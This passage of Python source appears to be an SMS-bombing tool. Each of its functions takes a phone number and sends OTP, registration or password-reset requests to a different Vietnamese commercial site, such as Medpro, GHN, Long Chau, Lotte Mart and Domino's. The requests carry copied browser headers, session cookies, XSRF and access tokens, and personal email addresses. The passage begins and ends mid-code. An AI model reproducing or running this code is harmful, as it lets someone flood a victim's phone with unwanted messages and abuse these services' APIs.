        'recaptchaResponse': '03AFcWeA70TMZnOmc5P7mdDGc5hjFSjvcoMvdMa1zwhX8shP7LpErTEiOrFaUFPFPE1EIrJ81dNGOdIpUJuDmImzC5Z2nS5gG7uztywbERyRr_GFYxy5fkyhlAuhLivAU-79T9EIGpDjk7L8lV_zSU-OdMxpOTIMN5F7uPhQY5ir54Ojfcf_LcXNDAApG__hIUvT7NF7i7TqSyyi1AULft7wDRa4SvWKM2kq3ZCm_P654oL1zJf_UvLQKatKVOYxBPebSrtGx9Xv_7QiuK3lGyBVJfiqo-9fvLd_hgCOtps8hMbQV3Vz6UPuwqTaZfAQgyw9ACJaJKHSo_iA48xp3SdJk6sBmnRLW5LS0XhxhDdOUWma-xafXFWqNI_y0DK05JJBRRujjoXus79l_yJ7deaA-r1pFvlVW_J6IwHsz7jxAP4ty3NkOVTdAi_THdxFsjfy3fNGYO-cW6GjV02yu9F0jcraw0pt5uGghyDcGhbYl2S48HCYir18qJFefW4tZ9DqiZ1XJ_sb34aQsr0jfUJG8wbZMrkPU4mdT8nDlMkpUqp4bp3ELYUxiwlEVGwqfeeHkX-aSU_th2PVCACDcxxpfVUZLPRi1aXuEfhnOF_CyMYQ0sLURvJO7uTDjz6lK1IFqoj5WLdNb5Ob_P-itcvYLOC42rc41D0naxjkiZRy0k1Wnrqi0m2ihsF_nmGlFWSuNGn0yFgfl6gTTnDJ7vpCCkRlKqKXQEflk1_LBz9J3i9k_PzDlp5c1GJwPHKgAqbi6rl11MtsjY_iJ2SNmxsyv-DCBVMRlMPw1lP87k-fnZQa_5pVDeKnZedSMdh1B5zMayLiIxHKKJ0bHRE-c1Vk4fYrIWKGikKqFfushaa9LCkE_FteLTAKAo5KPWc2eSEy7V4EP3CPBGPx6lkyBaWxEbqlyPmrcl1eSoom9l9sF66K5LOEcMm2RWM3NxXWe6MAOEufch_RjJAek7dqhPXiy2tN1e5mYqvDBpEzaBppbzWeDY13-oWpjTZAR8iDr0Sr3nrk6ygwFWVHsJ-9mW0PI8fCpbWxXJ49sQ_oODhbayALbjL9VaShtu5efpF3jkAMjQSw1z5wC8Poqq8ci5iRcQSvd6jLLqJ04ymW6nmYFgaHXftiernl-O3jJwYBLP2Is6ZrS8Ee-RThVWtpPWO3y10JeuasK2d5CQAWak3YRbuMIxtuK2CE9Ypaj-TgJPNhAG5uIJRMWwVJ3m17fUKEWEOdI7-0vFL1wyliQHgAVA6ISsW4hFxf0CtMvj20ekClRqweN545YOuNKc5TMjKaSRJGBn4maMg8Nbltv9U7YDfjghJywW69w6EkH8yqtsoY1gQW24z10kFsJWXgKJWdyW3HeGFPzDBKBBP93wG6pn0ghEmgFNW98Yt8mUMlyh0VtK7R0nTT46J1Tl10TvCqmLHueGgMvqxZBnXG16j6K9bCZZioWGju_0q_rtbusqcc88hve2Hy9c1tLk8XL-LZ7lectnaBaE-xA4GhAif11aFCUULXPKBkn3uwsGamaunspzT-H4A7ciSU4jJlK-1el2U1SH9R2oQm1eUP0Eh_YlU9s9pN5Dv6xnnLYvdE2KnVhcwTvRGaegLhzSHAPvW-S4eppkSa4T-COVr113ZU3cGol-WFEmMz8SUksoc4Fyz5i2Z6LHiLCQFSo6ITbI2pYrLWc0WIMtxooQj_ysPznRJURQSul2osWDBD5ZLQINrVPifREwlNAbGiEgit_ve9CZaE-ktOGnazUGF8dCGfQWw1BeSd52Ltk5m-QAiAkGq4B8zpSJqC2cMiUEe4gS47FiMEjwyhVjoZKbRvfn0O-UEOKTM2ja7ZdtmGGvOrLmorIJqQBBaw6a5y8weNnPfSdDnaJGdKLTXyrQ0h44ofKmuEzMVITurc5HB4z6-uhkbivaODZYWiiyDTMlTg2pXW6Zq4IzShAQJbaAMgoiv_r8o7dJGNGE8IABGVYf2LRWypES1HYHXHfyHA3mIOKNmYAe0Q9biK-rgQusons39w51x6OZAMILhW3-zsmpIMfwhKSXLGMor-Gj5cFu4lLCVx42S0-VdMVdJdnHwFQrOUU7YBm-vVtkZq4kalV6EJAjUkSS7tX2ouPIRW7gtRao1EYt99n_jseLrj9-8WzwNgi1i9RajZLmytjrva8wXG3gzenMLnNAia6e',
    },
}

   response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
def kingz(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'domain': 'kingfoodmart',
    'origin': 'https://kingfoodmart.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': phone,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
}

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
def med(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://id-v121.medpro.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://id-v121.medpro.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'appid': 'medpro',
    'cskhtoken': '',
    'locale': '',
    'momoid': '',
    'osid': '',
    'ostoken': '',
    'partnerid': 'medpro',
    'platform': 'pc',
}

    json_data = {
    'fullname': 'người dùng medpro',
    'deviceId': '401387b523eda9fc5998c36541400134',
    'phone': phone,
    'type': 'password',
}

    response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data)
###
def ghn(phone):
    headers = {
    'authority': 'online-gateway.ghn.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'pragma': 'no-cache',
    'referer': 'https://sso.ghn.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': phone,
    'type': 'register',
}

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
 ###
def shop(phone):
    cookies = {
    '_gcl_au': '1.1.1745429184.1691586808',
    '_fbp': 'fb.1.1691586808676.1451418847',
    '_ga': 'GA1.2.1936138960.1691586808',
    '_gid': 'GA1.2.1897491687.1691674994',
    '_gat_UA-78703708-2': '1',
    '_ga_P138SCK22P': 'GS1.1.1691674994.3.1.1691675011.43.0.0',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gcl_au=1.1.1745429184.1691586808; _fbp=fb.1.1691586808676.1451418847; _ga=GA1.2.1936138960.1691586808; _gid=GA1.2.1897491687.1691674994; _gat_UA-78703708-2=1; _ga_P138SCK22P=GS1.1.1691674994.3.1.1691675011.43.0.0',
    'Origin': 'https://shopiness.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://shopiness.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'action': 'verify-registration-info',
    'phoneNumber': phone,
    'refCode': '',
}

    response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data)  
###
def gala(phone):
   headers = {
    'accept': '*/*',
    'accept-language': 'vi',
    'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0ZTc1NmU4My1kNDcxLTQxY2YtODE5Ny1mNWQ0N2I4YzAzNDAiLCJkaWQiOiJjMjAzNzY3YS03MzU4LTQ5MDYtYmIxMS00MjVkNWZmYjRmMDEiLCJpcCI6IjI3LjIuMTM2LjE5NCIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8cGN8d2luZG93c3wxMHxjaHJvbWUiLCJhcHBfdmVyc2lvbiI6IjIuMC4wIiwiaWF0IjoxNzIzMjY4Mzc4LCJleHAiOjE3Mzg4MjAzNzh9.BVIQWLVz7mxQK5cNgjnaut9D9UdOsAFzEBrnj-EAMWM',
    'origin': 'https://galaxyplay.vn',
    'priority': 'u=1, i',
    'referer': 'https://galaxyplay.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

   params = {
    'phone': phone,
}
   response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
def ahamove(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://app.ahamove.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://app.ahamove.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'mobile': phone,
    'name': 'khải',
    'email': 'khaisasdjksn@gmail.com',
    'country_code': 'VN',
    'firebase_sms_auth': 'true',
    'time': 1720101304,
    'checksum': 'Ux7gAkb+yFErrq5SsmdmJ8KE31qEen0zSglqznawm5X62j/7LCI+vpgPc7zLxxfpCVrrtQPzKCv5TP0U6pPPa1bjkQT4dF7ta4VDKHqb5fNAkyp9AUkDXexZ7XvsC8qgVWJKHFwj7X5sacNq/LG8yWTuaTP5z+5pLdgzRja8MSPsnX4Sbl2Alps+vm3bc6vZH67c2gA1ScxiZrXotAiwfRgiTH500HJGYz+4h7t6H6r4TXqHQyhPGcUEQUTuW1201w740aVOpx/VvcqBGjLaUWvI6GJJjHGVN1b+EcIc/JnDa068qudt+vfBxBGT6Jt/qcigwxUG9rf0DJvzkbqJfg==',
}

    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data)
def lon(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'access-control-allow-origin': '*',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://nhathuoclongchau.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://nhathuoclongchau.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-channel': 'EStore',
}

    json_data = {
    'phoneNumber': phone,
    'otpType': 0,
    'fromSys': 'WEBKHLC',
}

    response = requests.post(
    'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
    headers=headers,
    json=json_data,
)
def medi(phone):
    cookies = {
    'SERVER': 'nginx3',
    '_gcl_au': '1.1.2035327165.1720297698',
    'XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D',
    'medicare_session': 'eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.510182867.1720297701',
    '_gid': 'GA1.2.1839608181.1720297709',
    '_gat_gtag_UA_257373458_1': '1',
    '_fbp': 'fb.1.1720297708926.352505189707594376',
    '_ga_CEMYNHNKQ2': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
    '_ga_8DLTVS911W': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
    '_ga_R7XKMTVGEW': 'GS1.1.1720297700.1.1.1720297727.33.0.0',
}

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'SERVER=nginx3; _gcl_au=1.1.2035327165.1720297698; XSRF-TOKEN=eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D; _ga=GA1.2.510182867.1720297701; _gid=GA1.2.1839608181.1720297709; _gat_gtag_UA_257373458_1=1; _fbp=fb.1.1720297708926.352505189707594376; _ga_CEMYNHNKQ2=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_8DLTVS911W=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_R7XKMTVGEW=GS1.1.1720297700.1.1.1720297727.33.0.0',
    'Origin': 'https://medicare.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://medicare.vn/login',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0=',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'mobile': phone,
    'mobile_country_prefix': '84',
}

    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
def acfc(phone):
    cookies = {
    '_evga_d955': '{%22uuid%22:%22a93baeb4ee0b4f94%22}',
    '_gcl_gs': '2.1.k1$i1720297927',
    '_gcl_au': '1.1.1109989705.1720297932',
    '_gcl_aw': 'GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB',
    '_ga': 'GA1.1.669040222.1720297933',
    '_sfid_599e': '{%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}',
    '_tt_enable_cookie': '1',
    '_ttp': 'XkRw_9JIScHjzJOJvMn0bzslTxh',
    'PHPSESSID': 'puf048o1vjsq9933top4t6qhv3',
    'aws-waf-token': '537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==',
    'form_key': 'z6U4dNbxwcokMy9u',
    '_fbp': 'fb.2.1720297944244.46181901986930848',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'mage-messages': '',
    'optiMonkClientId': 'c6552caa-6bee-d03e-34ca-6d9b47869e59',
    '_ga_PS7MEHMFY3': 'GS1.1.1720297933.1.1.1720297944.49.0.0',
    'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===',
    'optiMonkSession': '1720297946',
    'form_key': 'z6U4dNbxwcokMy9u',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_evga_d955={%22uuid%22:%22a93baeb4ee0b4f94%22}; _gcl_gs=2.1.k1$i1720297927; _gcl_au=1.1.1109989705.1720297932; _gcl_aw=GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB; _ga=GA1.1.669040222.1720297933; _sfid_599e={%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}; _tt_enable_cookie=1; _ttp=XkRw_9JIScHjzJOJvMn0bzslTxh; PHPSESSID=puf048o1vjsq9933top4t6qhv3; aws-waf-token=537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==; form_key=z6U4dNbxwcokMy9u; _fbp=fb.2.1720297944244.46181901986930848; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=c6552caa-6bee-d03e-34ca-6d9b47869e59; _ga_PS7MEHMFY3=GS1.1.1720297933.1.1.1720297944.49.0.0; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===; optiMonkSession=1720297946; form_key=z6U4dNbxwcokMy9u',
    'origin': 'https://www.acfc.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.acfc.com.vn/customer/account/create/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'number_phone': phone,
    'form_key': 'z6U4dNbxwcokMy9u',
    'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
}

    response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data)
def lote(phone):
    cookies = {
    '__Host-next-auth.csrf-token': '2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6',
    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    '_gcl_au': '1.1.2136712951.1720299022',
    '_ga': 'GA1.1.164372556.1720299023',
    '_fbp': 'fb.1.1720299024438.549668172235070425',
    '_ga_6QLJ7DM4XW': 'GS1.1.1720299022.1.1.1720299051.31.0.0',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '__Host-next-auth.csrf-token=2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.2136712951.1720299022; _ga=GA1.1.164372556.1720299023; _fbp=fb.1.1720299024438.549668172235070425; _ga_6QLJ7DM4XW=GS1.1.1720299022.1.1.1720299051.31.0.0',
    'origin': 'https://www.lottemart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'username': phone,
    'case': 'register',
}

    response = requests.post(
    'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def domi(phone):
    cookies = {
    '_gid': 'GA1.2.1143586587.1720312773',
    '_fbp': 'fb.1.1720312773608.72318382363231927',
    '_gcl_gs': '2.1.k1$i1720312921',
    '_gat_UA-41910789-1': '1',
    '_ga': 'GA1.1.2103093724.1720312773',
    '_ga_12HB7KTL5M': 'GS1.1.1720312772.1.1.1720312932.49.0.0',
    '_ga_8GXKYDTW3R': 'GS1.1.1720312772.1.1.1720312933.0.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '_gid=GA1.2.1143586587.1720312773; _fbp=fb.1.1720312773608.72318382363231927; _gcl_gs=2.1.k1$i1720312921; _gat_UA-41910789-1=1; _ga=GA1.1.2103093724.1720312773; _ga_12HB7KTL5M=GS1.1.1720312772.1.1.1720312932.49.0.0; _ga_8GXKYDTW3R=GS1.1.1720312772.1.1.1720312933.0.0.0',
    'dmn': 'doqkqr',
    'origin': 'https://dominos.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://dominos.vn/promotion-listing/bogo-week-digital-t7',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone_number': phone,
    'email': 'nguyentrongkhai130@gmail.com',
    'type': 0,
    'is_register': True,
}

    response = requests.post('https://dominos.vn/api/v1/users/send-otp', cookies=cookies, headers=headers, json=json_data)
def shop(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '441e8136801b70ac87887bca16dd298f',
    'origin': 'https://thefaceshop.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://thefaceshop.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720623654086',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
